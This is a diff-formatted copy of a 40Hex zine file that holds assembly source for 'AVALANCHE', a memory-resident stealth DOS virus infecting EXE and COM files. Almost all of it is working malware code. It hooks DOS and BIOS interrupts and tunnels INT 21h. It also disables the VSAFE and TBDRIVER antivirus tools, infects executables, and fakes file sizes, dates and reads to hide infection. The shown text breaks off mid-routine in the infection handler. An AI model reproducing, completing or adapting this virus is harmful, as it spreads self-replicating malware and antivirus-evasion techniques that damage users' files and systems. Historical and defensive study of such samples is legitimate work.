@@ -1,0 +1,1886 @@
+40Hex Number 14 Volume 5 Issue 1                                      File 013
+
+;****************************************************************************
+;*                 Resident stealth infector 'AVALANCHE'                    *
+;*                  written by Metal Junkie in 1994/95                      *
+;****************************************************************************
+
+; 100% memory stealth
+; Int 21h Tunneling
+; Retro functions
+; EXE/COM - Infection
+; and many other features. Enjoy it!
+
+; Disclaimer: Warning! This source contains destructive code. Do not compile
+; it! The author is not responsible for any damage caused by this code.
+; And last but not least, greetings to Neurobasher,Stormbringer, the guys
+; of VLAD (hi qark) and the Unforgiven Metal Militia.
+
+code segment para 'code'
+.8086
+org 100h
+
+assume cs:code, ds:code, es:code, ss:code   ;
+
+;======== Initializing routines and decryption =============================
+
+; test options:
+
+EXEPERMIS  equ 1                        ; infect EXE Files
+COMPERMIS  equ 1                        ; infect COM files
+STEALTH    equ 1                        ; include stealth functions
+RETRO      equ 1                        ; anti scan
+
+start:               ; SS ist always equal CS !
+
+.386
+kenn:
+	mov	ecx,(offset (virende-vircode+1))  ; Adios F-Prot !
+kenn1:	mov	bx,(266+offset vircode)
+	jmp	patch
+        db      0eah                              ; Adios TBAV !
+entschl:  xor	byte ptr cs:[bx],0
+	inc	bx
+patch:	loop	entschl
+
+.8086
+
+; ------ Start of encrypted body ----
+
+vircode: call   getip            ; Only to fool simple scanners looking
+getip:   pop    ax               ; for the classic pop bp
+         mov    bp,ax
+	 sub	bp,(100h+(getip-start));
+patch5:  jmp	short conti
+	 db	81h
+conti:	 jmp	lab1
+
+;--- Constants ---------------------------------------------------------
+
+sprbef   equ    3               ; 3 Bytes for a JUMP
+monat    equ    01h             ; Date of activation
+itsme    equ    "sh"            ; Signature
+
+DOS_N    equ    21h             ; normal DOS Function 21
+
+
+db " AVALANCHE/Germany '94...Metal Junkie greets Neurobasher"
+
+;--- EXE-Header-Lokationen ---
+
+cs_pos   equ  16h               ; Position of Codesegment in EXE Header
+ss_pos	 equ  0eh
+ip_pos   equ  14h               ; IP
+ovl_no	 equ  1Ah
+hdl_pos  equ  08h               ; Size of Header
+sp_pos   equ  10h               ; SP
+min_par  equ  0ah               ; Min. amount of memory
+div512   equ  04h               ; Filelength  DIV 512
+mod512   equ  02h               ;             MOD 512
+segtab   equ  06h               ;
+chksum   equ  12h               ;
+
+;--- Variables ----
+
+cs_merk  dw (0)
+ds_merk  dw (0)                  ; store the original regs here
+es_merk  dw (0)
+sp_merk  dw 0fffeh
+ss_merk  dw (0)
+
+min_mem  dw 4096
+
+ip_merk  dw 0100h                ; pointer to first instruction of host
+wirt     dw (?)                  ; this is a far jump to the host
+combytes db 0C3h,0h,01h          ; buffer for host bytes (COM)
+com_vek  db 0e9h,0,0             ; jump vector (COM)
+;---
+
+org_filelng_lo  dw (?)           ; original length of host
+org_filelng_hi	dw (?)
+mem_strat   dw (?)               ; buffer for allocation strategy
+umb_strat   db (?)
+comflag     db 1                 ; 1=host is a COM-file
+generation  dw 0
+
+;------- check activation circumstances ------------------------------------
+
+lab1:   cli
+        mov     [bp+ds_merk],ds   ; store original segments here
+
+        cld
+        push    cs                ; setup registers
+	pop	ds
+
+        mov     ax,4bf0h           ; Are we resident in memory ?
+        xor     di,di
+	int	DOS_N
+        cmp     di,itsme
+        jne     lab32
+        jmp      restore_com      ; Yes, we are -> exit
+
+lab32:  mov     ah,30h            ; Dos-Version ?
+	int	DOS_N
+	cmp	al,5
+	jae	lab4
+        jmp     restore_com       ; exit when < 5.0
+
+lab4:   mov     ah,04h            ; enable virus [Monat] 1994
+	int	1ah
+	jc	lab5
+        cmp     cx,1996h
+	jae	lab5
+	cmp	dh,monat
+	jae	lab5
+	jmp	restore_com
+
+lab5:   call    killscan         ; kill VSAFE/VWATCH
+
+        mov     ah,0eh           ; search or SDScan Novell Dos 7.0
+	mov	dl,0adh
+	int	DOS_N
+	cmp	al,0bah
+	jne	initvir
+
+        jmp     restore_com      ; Scanner active ==> Exit
+
+;---------------------------------------------------------------------------
+
+dowirt: mov	ax,[bp+ds_merk]
+        mov     ds,ax              ; restore     DS/ES
+	mov	es,ax
+        cmp     [bp+comflag],1     ; Is host a COM file ?
+	je	do2
+
+	mov	ax,es
+        add     ax,[bp+cs_merk]    ; old codesegment in vector
+	add	ax,16
+	mov	word ptr [bp+wirt],ax
+        mov     sp,[bp+sp_merk]    ; restore stack
+	mov	ax,es
+	add	ax,cs:[bp+ss_merk]
+	add	ax,16
+	mov	ss,ax
+	jmp	short do3
+
+do2:	mov	ax,cs
+	mov	cs:[bp+wirt],ax
+do3:    xor     ax,ax           ; Important ! All Registers have to be ZERO
+	mov	bx,ax
+	mov	cx,ax
+	mov	dx,ax
+	mov	si,ax
+	mov	di,ax
+	sti
+
+        jmp     dword ptr cs:[bp+ip_merk] ; jump to host
+
+;---- Allocate memory for virus      --------------------------------------
+
+initvir: mov    ax,[bp+ds_merk]     ; free memory
+        mov     es,ax               ; start segment to ES
+        mov     bx,[bp+min_mem]     ; amount needed for virus
+        mov     ah,4ah              ; change memory allocation
+	int	DOS_N
+	jae	init11
+	jmp	restore_com
+
+init11: push	cs
+	pop	es
+        mov     byte ptr [bp+notarn],0    ; enable  stealth functions
+	mov	byte ptr [bp+virtod],0
+
+;--- get free block in the TOM     -----------------
+
+        mov     ax,5800h            ; get allocation strategy
+	int	DOS_N
+        mov     [bp+mem_strat],ax   ; und store it
+
+        mov     ax,5802h            ; get UMB Status
+        int     DOS_N               ; DOS<5.0 C=1,AX=1
+	jae	init1
+	jmp	restore_com
+
+init1:  mov     [bp+umb_strat],al   ; store it
+
+        mov     ax,5801h             ; set new strategy
+        mov     bx,0000000000000010b ; Last Block, search in TPA only
+        int     DOS_N
+        mov     ax,5803h             ; disable usage of UMB
+	mov	bx,0
+	int	DOS_N
+        mov     bx,(((virende-start+100) shr 4) +33) ; Virus in Paragr.
+                                     ; + place to store Trojan
+        mov     ah,48h               ; allocate RAM for virus
+	int	DOS_N
+	jc	resetall
+        push    ax                   ; store allocated segment
+	dec	ax
+        mov     es,ax                ; ES to MCB of alloc. memory
+	inc	ax
+
+	mov	word ptr es:[0],"Z"
+        mov     word ptr es:[1],8    ; make us resident as part of DOS
+
+
+        mov     ax,3521h            ; get old INT 21h
+	int	DOS_N
+	mov	word ptr [bp+int21alt],bx
+	mov	word ptr [bp+int21alt+2],es
+
+        mov     word ptr [bp+OrgDos],bx  ; if tracer failed :(
+	mov	word ptr [bp+OrgDos+2],es
+
+        call    TunnelIt            ; trace the INT 21h vector
+        cmp     ax,0ffh             ; have we found the vector ?
+	je	notun
+
+        mov     word ptr [bp+OrgDos+2],es ; store the new entry
+	mov	word ptr [bp+OrgDos],ax
+
+notun:  mov     ax,3513h            ; get old BIOS interrupt 13h
+	int	DOS_N
+	mov	word ptr [bp+int13alt],bx
+	mov	word ptr [bp+int13alt+2],es
+
+        pop     es                  ; get back virus-segment
+	push	es
+	mov	si,offset start
+	add	si,bp
+	mov	di,100h
+	mov	cx,offset (virende-start)
+        rep     movsb               ; Copy the virus to TOM
+
+        mov     dx,offset int21     ; hook INT21h to virus handler
+        mov     ax,2521h
+        pop     ds                  ; get back virus segment
+	int	DOS_N
+
+        mov     dx,offset int13     ; hook BIOS-Interrupt to virus handler
+        mov     ax,2513h
+	int	DOS_N
+
+resetall: push	cs
+	  pop	ds
+
+          push  [bp+ds_merk]        ; restore memory allocation
+	  pop	es
+	  mov	bx,0ffffh
+	  mov	ah,4ah
+	  int	DOS_N
+	  mov	ah,4ah
+	  int	DOS_N
+
+          mov   bl,[bp+umb_strat]  ; restore old UMB strategy
+          xor   bh,bh
+          mov   ax,5803h
+          int   DOS_N
+
+	  mov	bx,[bp+mem_strat]  ; Alte Strategie zurck
+	  mov	ax,5801h
+	  int	DOS_N
+
+; restore orinal JUMP to host
+
+restore_com:  cmp   [bp+comflag],1    ; is it a COM file ?
+	  jne	initende
+
+          mov  di,[bp+ip_merk]    ; build up traget adress
+
+          mov  si,offset combytes ; restore original bytes to host
+          add  si,bp              ; only necessary if .com - EXE has a direct
+          mov  cx,sprbef          ; vector.
+	  rep  movsb
+
+initende: jmp dowirt
+
+; --------- Kill VSAFE and VWATCH and TBDRIVER -------------------
+; you can use this function from the resident part of virus too
+
+killscan proc near
+
+	  push	es
+	  push	ax
+	  push	bx
+	  push	cx
+	  push	dx
+	  push	si
+	  push	di
+
+          mov  ax,0fa00h        ; Vsafe resident ?
+	  mov  dx,5945h
+	  int  16h
+          cmp  di,4559h
+	  jne  ks1
+
+	  mov  ax,0fa02h
+	  mov  dx,5945h
+	  mov  bl,0
+          int  16h              ; get old flags to CL
+
+          and  cl,23            ; disable only parts of scanner
+          mov  bl,cl            ; because the full deinstallation causes
+          mov  ax,0fa02h        ; warnings
+	  mov  dx,5945h
+	  int  16h
+
+ks1:	  push ds
+	  xor  ax,ax
+	  mov  ds,ax
+          les  si,ds:[21h*4]    ; get INT 21h handler
+	  pop  ds
+          mov  ax,word ptr es:[si] ; get first two instructions of INT 21h
+	  cmp  ax,05ebh 	   ; Is it that fucking TBDRIVER ?
+	  jne  ks2
+	  mov  word ptr es:[si],9090h ; Bomb it out of memory  !!!
+
+          ; This works because there is a far-jump to DOS directly behind
+          ; the near jump to the scanner
+
+ks2:	  pop  di
+	  pop  si
+	  pop  dx
+	  pop  cx
+	  pop  bx
+	  pop  ax
+	  pop  es
+	  ret
+
+killscan endp
+
+;**************************************************************************
+;***             INT 21h Tracer to locate the entry of DOS              ***
+;*** Setting up some parameters for the tracing routine                 ***
+;**************************************************************************
+
+; INPUT : none
+; OUTPUT : Original-DOS-vektor in ES:AX
+
+Tunnelit PROC NEAR
+
+        mov     ah, 52h                 ; get the DIB adresse
+	int	DOS_N
+	jc	tuend
+        mov     ax,es:[bx-2]            ; vector to first MCB -> ES:AX
+        mov     word ptr [bp+dos_seg],ax ; here is the DOS segment
+
+	xor	ax,ax			; ES=0
+	mov	es,ax
+        les     ax, es:[1*4]            ; store original INT 1
+	mov	word ptr [bp+oldint1], ax
+	mov	word ptr [bp+oldint1+2], es
+
+	mov	cs:[bp+sflag],0
+        mov     word ptr cs:[bp+deltaoff],bp ; set up delta offset
+
+	cli
+        xor     ax,ax                   ; hook INT 1 to tracer
+	mov	es,ax
+        mov     bx,offset int1          ; delta Offset!
+	add	bx,bp
+	mov	word ptr es:[1*4],bx
+	mov	es:[1*4+2],cs
+	sti
+
+        pushf                           ; enable single step
+        pop     ax                      ; by setting the T-Flag
+	or	ah,1
+	push	ax
+	popf
+
+        mov     ah,0bh                  ; get keyboardstatus to find
+        cli                             ; the entry
+	pushf
+	call dword ptr cs:[bp+int21alt]
+
+        pushf                           ; single step off
+        pop     ax                      ; AX=FF if tracer failed
+	and	ax,0feffh
+	push	ax
+	popf
+
+        cli                             ; restore old Int 1
+	push	ds
+	xor	ax,ax
+	mov	ds,ax
+        les     ax, cs:[bp+oldint1]
+	mov	word ptr ds:[1*4], ax
+	mov	word ptr ds:[1*4+2], es
+	pop	ds
+	sti
+
+        cmp     [bp+sflag],1            ; was tracing successful ?
+        jne     nosuccess
+
+	mov	ax,word ptr [bp+oldint21+2]
+	mov	es,ax
+	mov	ax,word ptr [bp+oldint21]
+
+tuend:	ret
+
+nosuccess: mov  ax,0ffh                 ; nope, we have no entry :(
+
+	jmp short tuend
+
+oldint1 	dd ?
+oldint21	dd ?
+sflag		db 0
+dos_seg 	dw ?
+
+Tunnelit ENDP
+
+;**************************************************************************
+;***             Single Step interrupt routine                          ***
+;*** Tries to find the original entry of the DOS to fool reesident      ***
+;*** scanners                                                           ***
+;**************************************************************************
+
+int1	PROC FAR
+
+	push	bp
+	mov	bp,sp
+	push	ax
+	push	si
+	db	0BEh		 ; mov si, deltaoff
+deltaoff dw (?)
+        mov     ax, [bp+4]       ; get segment of return adress
+        cmp     ax,cs:[si+dos_seg] ; is it in the DOS segement ?
+        jbe     foundit
+
+ex_int1:pop	si
+	pop	ax
+	pop	bp
+	iret
+
+foundit:                         ; yes, we've found the entry
+        mov     word ptr cs:[si+OldInt21+2],ax  ; store segment (bp+4)
+	mov	ax,[bp+2]
+        mov     word ptr cs:[si+OldInt21],ax    ; store offset
+	mov	cs:[si+sflag],1
+        and     word ptr [bp+6], 0FEFFh         ; Tracing off
+	jmp	short ex_int1
+
+INT1 ENDP
+
+;****************************************************************************
+;****			      Interrupt  21 Handler			 ****
+;****************************************************************************
+
+
+;--- Variables :
+
+psp       equ 0                    ; ununsed PSP for buffer
+
+; --- Interruptvektors ---
+
+crbreak   dd (?)                   ; Old Critical-Error-INT
+int21alt  dd (?)                   ; Old Dos-Interrupt
+int13alt  dd (?)                   ; Old BIOS-Interrupt
+OrgDos    dd (?)                   ; Original-DOS-Interrupt
+
+; --- Variables ---
+
+nam_off   dw (?)                   ; filename offset
+nam_seg   dw (?)                   ; filename segment
+dtaseg    dw (?)                   ; segment of DTA
+dtaoff    dw (?)                   ; offset of DTA
+d_datum   dw (?)                   ; file date
+d_zeit    dw (?)                   ; time of last change
+d_attrib  dw (?)                   ; old files attributes
+handle    dw (?)                   ; file handle
+ret_off   dw (?)
+
+; --- Flags ---
+
+internal  db 0                     ; indicates internal usage of routines
+flag      db 0                     ; allround flag
+virtod    db 0                     ; 1=Virus is disabled
+notarn    db 0                     ; 1=Stealth functions disabled
+
+
+comsuff   db "*.com",0
+
+;----------------------------------------------------------------------------
+
+cint      proc far                 ; Critical-Error-INT
+                                   ; to prevent virus from generating errors
+          sti                      ; during access on write proteted disks
+          mov  al,3
+          iret
+
+cint	  endp
+
+;----------------------------------------------------------------------------
+
+int21     PROC  FAR                ; new INT 21 handler
+
+	  IF STEALTH
+	  cmp	ah,4bh		   ; Exec-Interrupt  ?
+          jne   check_stealth      ; no, let's check stealth
+
+	  ELSE
+	  cmp ah,4bh
+	  jne aus2
+	  ENDIF
+
+is_exec:  cmp   al,0f0h            ; virus self check
+	  je	rescheck
+          cmp   al,05h             ; ignore special exec functions
+	  je	aus2
+	  cmp	al,03h
+	  je	aus2
+
+          mov cs:[internal],0      ; internal usage of INT 21 handler
+          jmp   exec               ; yeah, it's the exec function
+
+rescheck:  mov   di,itsme          ; its me -> return to caller
+          iret
+
+aus2:    jmp   cs:[int21alt]       ; jump to original INT 21h
+
+
+;=== Handler for stealth functions of INT 21h ====================
+
+	  IF STEALTH
+
+check_stealth:
+          cmp   cs:[virtod],1      ; Ist Virus disabled ?
+	  je	aus
+          cmp   cs:[notarn],1      ; Is Stealth shield disabled ?
+	  je	aus
+
+	  cmp	ah,4eh		   ; Find-First (Handle) ?
+	  jne	chk_hdl
+	  jmp	ff_hdl
+
+chk_hdl:  cmp	ah,4fh		   ; Find-Next (Handle) ?
+	  jne	chk_fcb
+	  jmp	ff_hdl
+
+chk_fcb:  cmp	ah,11h		   ; Find-First (FCB) ?
+	  je	firstnext
+	  cmp	ah,12h		   ; Find-Next (FCB) ?
+	  je	firstnext
+
+          jmp   short holdat       ; no, continue check
+
+; ---- date/time fooling              ---------------------------------------
+
+holdat: cmp   ax,5700h           ; is someone asking on date/time of afile?
+	jne   schieb_zeiger
+	jmp   deal_dat
+
+schieb_zeiger:                   ; maybe a movement of file pointer?
+
+	cmp	ah,42h
+	jne	read_3f
+	jmp	deal_zeiger
+
+read_3f:                         ; a file read function ?
+	cmp  ah,3fh
+	jne  aus
+	jmp  deal_read
+
+aus:    jmp   cs:[int21alt]      ; jump to old interrupt
+
+	ENDIF
+
+int21 endp
+
+;------------------------ Handler-Bodies --------------------------------------------------
+
+	  IF STEALTH
+
+ff_hdl  proc near             ; handle find-first-next (handle)
+
+        pushf                 ; call function first
+        call cs:[int21alt]
+
+        jc   ngef             ; any files found ?
+	jmp  short findfn1
+ngef:	retf  2
+
+findfn1: call pushall             ; save all registers
+
+        mov  ah,2fh               ; get DTA adress to ES:BX
+        int  DOS_N
+        mov  ax,es:[bx+18h]        ; get date of file
+        and  ax,1111111000000000b  ; mask out the month
+	mov  cl,9
+	shr  ax,cl
+        cmp  ax,90d               ; compare with 90
+        jna  findfnende           ; year < 90 -> file is clean
+
+        sub  word ptr es:[bx+26],(virende-start) ; shrink filelength
+	sbb  word ptr es:[bx+28],0
+
+        sub  word ptr es:[bx+18h],1100100000000000b ; date=date-100 years
+
+findfnende: call popall
+
+	retf 2
+
+ff_hdl	   endp
+
+;---------------------------------------------------------------------------
+
+firstnext proc near               ; handle the fcb functions
+
+          pushf                   ; call function
+	  call	cs:[int21alt]
+
+	  call pushall
+          cmp  al,255             ; any files found ?
+	  jne  continue
+          jmp  short fcbende      ; no, then exit
+
+continue: mov  ah,2fh             ; get DTA adress to ES:BX
+          int  DOS_N
+
+          cmp  byte ptr es:[bx],255 ; is it a large FCB ?
+	  je   erwfcb
+
+          mov  si,19h              ; date entry (secret DOS)
+          mov  di,1dh              ; filelength (secret DOS)
+	  jmp  short normfcb
+
+erwfcb:   mov  si,20h              ; date entry (secret DOS)
+          mov  di,24h              ; filelength
+
+normfcb:  mov  ax,es:[bx+si]       ; get file and date stamps
+          and  ax,1111111000000000b ; mask out the month
+	  mov  cl,9
+	  shr  ax,cl
+          cmp  ax,90d              ; compare with 90
+          jna  fcbende             ; year < 90 -> file is clean
+
+          sub  word ptr es:[bx+di],(virende-start) ; change date/length
+	  sbb  word ptr es:[bx+di+2],0
+
+	  sub  word ptr es:[bx+di-7],(virende-start)
+	  sbb  word ptr es:[bx+di-7+2],0
+          sub  word ptr es:[bx+si],1100100000000000b
+
+fcbende:  call popall
+
+	  retf 2
+
+firstnext endp
+
+;----------------------------------------------------------------------------
+
+deal_dat  proc near
+
+	pushf
+	call  cs:[int21alt]
+
+        pushf                    ; don't save DX, it holds the date
+        push  ax
+	push  cx
+
+	mov  ax,dx
+        and  ax,1111111000000000b ; mask out month
+	mov  cl,9
+	shr  ax,cl
+        cmp  ax,90               ; compare with 90 years
+        jna  deal_datende          ; year<90 -> file is clean
+
+        sub  dx,1100100000000000b ; subtract 100 years
+
+deal_datende:
+	pop  cx
+	pop  ax
+	popf
+
+	retf 2
+deal_dat  endp
+
+;---------------------------------------------------------------------------
+
+; Don't let the file pointer hit the virus
+
+deal_zeiger proc near
+
+        cmp     al,02h              ; handle funktion 2 only
+	jne	zg_do_function
+	or	cx,dx
+	jne	zg_do_function
+
+        call    pruefinf            ; file infected ?
+	jae	zg_do_function
+
+	mov	cx,0ffffh
+        mov     dx,-(virende-start)  ; subtract virus size
+	pushf
+	call	cs:[int21alt]
+
+        retf 2                       ; and exit
+
+zg_do_function:
+	jmp cs:[int21alt]
+
+deal_zeiger endp
+
+; ---------------------------------------------------------------------------
+; funktion deal_read: Filters the virus on file access. The memory image is
+; clean. Virus contains the original header bytes at his end.
+
+rd_handle       dw (?)            ; file handle
+rd_bytes        dw (?)            ; amount of bytes to read
+
+rd_aktpos_lo    dw (?)           ; actual file pointer position
+rd_aktpos_hi	dw (?)
+rd_endpos_lo	dw (?)
+rd_endpos_hi	dw (?)
+rd_virpos_lo	dw (?)
+rd_virpos_hi	dw (?)
+rd_es_merk	dw (?)
+rd_ds_merk	dw (?)
+rd_funktion	dw (?)
+rd_error_msg	dw (?)
+rd_puffer_off	dw (?)
+rd_bytes_read	dw (?)
+
+deal_read proc near
+
+        cmp     bx,5                ; Ist es file handle or a device ?
+	jae	dlrd1
+	jmp	do_read2
+
+dlrd1:
+        call    pruefinf           ; is file infected ?
+	jae	 do_read2
+
+	mov	cs:[rd_ds_merk],ds
+	push	cs
+	pop	ds
+	mov	[rd_funktion],ax
+	mov	[rd_handle],bx
+	mov	[rd_bytes],cx
+	mov	[rd_puffer_off],dx
+	mov	[rd_es_merk],es
+	jmp	dlrd2
+
+; restore all regs and do the read
+do_read0:  mov     cx,cs:[rd_bytes]   ; restore old CX
+
+; restore all regs exept for cx and do the read
+do_read1:
+	 mov	 bx,cs:[rd_handle]
+	 mov	 dx,cs:[rd_puffer_off]
+	 mov	 ax,cs:[rd_es_merk]
+	 mov	 es,ax
+	 mov	 ax,cs:[rd_ds_merk]
+	 mov	 ds,ax
+	 mov	 ax,cs:[rd_funktion]
+
+; don't restore regs and do the read
+do_read2: jmp	   cs:[int21alt]
+
+; return to caller with restored regs exept for ax
+do_ret1:
+	mov	cx,cs:[rd_bytes]
+        mov     dx,cs:[rd_puffer_off]
+	mov	bx,cs:[rd_es_merk]
+	mov	es,bx
+	mov	bx,cs:[rd_ds_merk]
+	mov	ds,bx
+	mov	bx,cs:[rd_handle]
+
+;return to caller without restored regs
+do_ret2:
+	retf	2
+
+dlrd2:  mov     ax,4201h           ; get file pointer position
+	xor	cx,cx
+	xor	dx,dx
+	pushf
+	call	cs:[int21alt]
+	jc	do_read0
+
+        mov     [rd_aktpos_lo],ax  ; store it
+	mov	[rd_aktpos_hi],dx
+
+        add     ax,[rd_bytes]      ; calc endposition of file pointer
+	adc	dx,0
+	mov	[rd_endpos_lo],ax
+	mov	[rd_endpos_hi],dx
+
+        mov     ax,4202h            ; get original filesize
+	xor	cx,cx
+	xor	dx,dx
+	pushf
+        call    cs:[int21alt]
+
+	sub	ax,(virende-start)
+	sbb	dx,0
+        mov     [rd_virpos_lo],ax   ; store the original size
+	mov	[rd_virpos_hi],dx
+
+	mov	ax,4200h
+	mov	cx,[rd_aktpos_hi]
+	mov	dx,[rd_aktpos_lo]
+	pushf
+	call	cs:[int21alt]
+
+	jae	rdmk1
+	jmp	do_read0
+
+; Now we have to make a few decisions where the pointer is and what
+; to do that he does not hit the virus body
+
+rdmk1:	mov	ax,[rd_aktpos_lo]    ; aktpos < 1dh
+	cmp	ax,1dh
+
+        jb      fall_1               ; pointer is in the header -> case 1
+
+	mov	bx,[rd_aktpos_hi]    ; aktpos < virpos ?
+	les	cx,dword ptr [rd_virpos_lo]
+        mov     dx,es                ; DX:CX = aktpos
+	call	comp_32bit
+        jb      fall_2               ; pointer is in the host -> case 2
+
+        jmp     fall_3               ; pointer is in the virus -> case 3
+
+
+; more decisions........
+
+fall_1: ;--- pointer is in the header ----
+
+        les     ax,dword ptr [rd_endpos_lo]; Endpos in header(endpos<1dh) ?
+	mov	bx,es			; BX:AX = Endpos
+	xor	dx,dx
+	mov	cx,1dh
+        call    comp_32bit             ; caller is going to....
+        jb      fall_11                ; read header only
+
+	les	cx,dword ptr [rd_virpos_lo]
+	mov	dx,es			; DX:CX = Virpos
+	call	comp_32bit
+        jb      fall_12                ; read header-host
+
+        jmp     fall_13                ; read header-host-virus
+
+fall_2: ; -- pointer is in the host ----
+
+	les	ax,dword ptr [rd_endpos_lo] ; Endpos < Virpos ?
+	mov	bx,es			; BX:AX = end_pos
+        les     cx,dword ptr [rd_virpos_lo]
+        mov     dx,es
+	call	comp_32bit
+        jb      hilf1                   ; end position is in the host
+        jmp     fall_22                 ; endposition is in the virus
+hilf1:	jmp	fall_21
+
+fall_3: ; --- pointer is in the virus ----
+
+        mov     ax,0                    ; return with zero bytes to caller
+	clc
+        jmp     do_ret1
+
+        ; --- actions according to th 6 cases above
+
+fall_11: ; --- caller is trying to read to header -----
+
+        mov     dx,1ch                ; how many bytes to read ?
+        sub     dx,[rd_aktpos_lo]
+	push	dx
+        neg     dx                    ; negative offset
+	mov	cx,0ffffh
+	mov	al,02h
+        call    set_pos               ; set pointer to corresponding byte
+                                      ; at the end of the virus where the
+                                      ; original bytes are stored
+
+        mov     dx,[rd_puffer_off]   ; read the original bytes from there
+	mov	cx,[rd_bytes]
+	mov	bx,[rd_handle]
+	mov	ah,3fh
+        push    [rd_ds_merk]         ; set DS to readbuffer
+	pop	ds
+	pushf
+	call	cs:[int21alt]
+
+	push	cs
+	pop	ds
+	mov	cx,[rd_endpos_hi]
+	mov	dx,[rd_endpos_lo]
+	mov	al,0
+        call    set_pos              ; correct the pointer position
+
+	jmp	do_ret1
+
+fall_12: ; --- caller is trying to read header+host ---
+
+	mov	cx,[rd_bytes]
+cross:  mov     bx,[rd_handle]       ; call read function
+	mov	dx,[rd_puffer_off]
+	push	[rd_ds_merk]
+	pop	ds
+	mov	ah,3fh
+	pushf
+	call	cs:[int21alt]
+	jae	f121
+	jmp	do_ret1
+
+f121:   push    cs                   ; DS=CS
+	pop	ds
+
+        mov     [rd_bytes_read],ax   ; store readed bytes
+
+        mov     dx,1ch                ; how many bytes from the header should
+        sub     dx,[rd_aktpos_lo]     ; have been read ?
+	push	dx
+        neg     dx                    ; negative offset
+	mov	cx,0ffffh
+	mov	al,02h
+        call    set_pos               ; set pointer to correcpondig bytes
+        jae     fall_12h1             ; behind the virus
+        pop     cx                    ; restore stack
+        jmp     reset_point           ; restore file point and exit
+
+fall_12h1:
+        pop     cx                      ; cx=ax (numer of bytes to read)
+	push	[rd_ds_merk]
+        pop     ax                      ; get buffer segment
+        mov     dx,[rd_puffer_off]      ; increase memory pointer
+	add	dx,[rd_aktpos_lo]
+        adc     ax,0                    ; take care of the carry flag
+	mov	ds,ax
+	mov	bx,cs:[rd_handle]
+	mov	ah,3fh
+	pushf
+        call    cs:[int21alt]           ; read original header
+	jae	fall_12h2
+	jmp	reset_point
+
+fall_12h2:
+	push	cs
+	pop	ds
+
+        mov     cx,[rd_aktpos_hi]       ; set pointer to new position
+	mov	dx,[rd_aktpos_lo]
+	add	dx,[rd_bytes_read]
+	adc	cx,0
+	xor	al,al
+	call	set_pos
+	mov	ax,[rd_bytes_read]
+	jmp	do_ret1
+
+fall_13: ; --- caller is trying to read header+host+virus
+
+        mov     ax,[rd_virpos_lo]    ; subtract virus bytes
+	sub	ax,[rd_aktpos_lo]
+
+	mov	cx,ax
+        jmp     cross                ; restore original cx
+
+fall_21: ; --- caller is trying to read the host
+
+        jmp     do_read0             ; no action necessary
+
+fall_22: ; --- caller is trying to read host+virus
+
+        mov     cx,[rd_virpos_lo]     ; subtract virus bytes
+        sub     cx,[rd_aktpos_lo]
+	push	cx
+        mov     bx,[rd_handle]        ; do the read function
+	mov	dx,[rd_puffer_off]
+	mov	ah,3fh
+	push	[rd_ds_merk]
+	pop	ds
+	pushf
+	call	cs:[int21alt]
+	pop	cx
+        jmp     do_ret2
+
+; Compare two 32bit numbers
+; INPUT   no  1: BX:AX
+;         no  2: DX:CX
+; Ausgabe:
+;         no  1=no  2   : ZF=1
+;         no  1>no  2   : CF=0,ZF=0
+;         no  1<no  2   : CF=1
+
+comp_32bit:
+
+        cmp     bx,dx           ; compare hi words
+        ja      comp_16end      ; no  1 > no  2
+        jb      comp_16end      ; no  1 < no  2
+        cmp     ax,cx           ; HI-Words eqaul -> compare low-words
+        ja      comp_16end      ; no  1 > no  2
+        jb      comp_16end      ; no  2 < no  2
+                                ; else  no  1 = no  2
+comp_16end:
+	 ret
+
+; restores the original file pointer position and leaves the routine
+; with error 'read 0 bytes'
+
+reset_point:
+	mov	dx,cs:[rd_aktpos_lo]
+	mov	cx,cs:[rd_aktpos_hi]
+	xor	al,al
+	call	set_pos
+	xor	ax,ax
+	clc
+	jmp	do_ret1
+
+; Routine to change pointer position
+; INPUT  :      al=offset-code
+;               cx:dx = new position
+
+set_pos:
+	push	ax
+	push	bx
+	push	dx
+
+	mov	ah,42h
+	mov	bx,cs:[rd_handle]
+	pushf
+	call	cs:[int21alt]
+
+	pop	dx
+	pop	bx
+	pop	ax
+
+	ret
+
+deal_read endp
+
+	ENDIF
+
+;===========================================================================
+
+INT13     PROC FAR                  ; INT 13h Handler
+
+orgint:   jmp cs:[int13alt]
+
+INT13 ENDP
+
+; *************************************************************************
+; *** new function 4ch of int 21                                        ***
+; *************************************************************************
+
+exec      proc near                ; handle an exec call
+                                   ; DS:DX pointer to filename
+	  call pushall
+
+          mov  cs:[internal],0     ; indicates call by foreign program
+          mov  cs:[notarn],0       ; stealth on
+
+          call killscan            ; kill scanners
+	  jmp  short exe0
+
+exec1:    call pushall             ; entry for internal usage
+          mov  cs:[internal],1     ; DS:DX pointer to filename
+
+exe0:     mov   cs:[nam_off],dx    ; store filename offset
+          mov   cs:[nam_seg],ds    ; and segment
+
+          mov   cs:[flag],0        ; reset infection flag
+
+	  push	ds
+	  push	dx
+          call discrit             ; disable error handler
+exe01:	  pop	dx
+	  pop	ds
+
+          mov   ax,4300h           ; get file attributes
+          int   DOS_N
+	  jae	exe1
+          jmp   exeaus2            ; exit on error
+
+exe1:     mov   cs:[d_attrib],cx   ; store attributes
+          test  cx,100b            ; is it a system file  ?
+	  je	exe2
+          jmp   exeaus2            ; yes? do not infect it
+
+exe2:     mov   ax,4301h           ; disable read-only attributes
+	  and	cx,1111111111111110b
+	  pushf
+	  call cs:[int21alt]
+	  jae	exe3
+	  jmp	exeaus
+
+exe3:     call fuck_scanner        ; fuck scanner
+
+          mov   ax,3d00h            ; open file with read-only
+	  pushf
+          call cs:[int21alt]        ; ds:dx filename
+          jae   exe4                ; access denied -> exit
+	  jmp	exeaus
+
+exe4:     mov   bx,ax               ; store handle in bx
+
+          push  cs                  ; DS=CS
+	  pop	ds
+
+	  mov	[handle],bx
+	  push	bx
+          mov   ax,1220h        ; get the sft table
+          int   2fh
+          mov   al,es:[di]      ; necessary because scanners locate
+          mov   bl,al           ; the TridenT Mirror virus in memory
+          mov   ax,1216h
+	  int	2fh
+	  pop	bx
+	  jae	exe41
+	  jmp	fehler
+
+exe41:    mov   word ptr es:[di+2],2 ; set file to read/write access
+
+          call  pruefinf        ; is file infected ?
+          jae   exe5
+	  jmp	fehler
+
+exe5:     mov   dx,psp          ; read the original header to psp
+          mov   cx,1ch
+	  mov	ah,3fh
+	  int	DOS_N
+	  jc	fehler
+
+          mov   si,dx                ; copy original header behind virus
+          mov   cx,1ch               ; for later memory stealth
+	  mov	di,offset orig_exehead
+	  push	cs
+	  pop	es
+	  rep	movsb
+
+          mov   ax,4202h            ; get the filesize by setting the
